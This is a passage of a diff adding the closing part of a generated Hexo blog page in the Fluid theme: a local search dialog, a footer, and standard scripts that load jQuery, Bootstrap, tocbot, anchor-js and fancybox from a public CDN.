+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="//lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="//lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="//lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="//lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('//lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=//lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('//lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
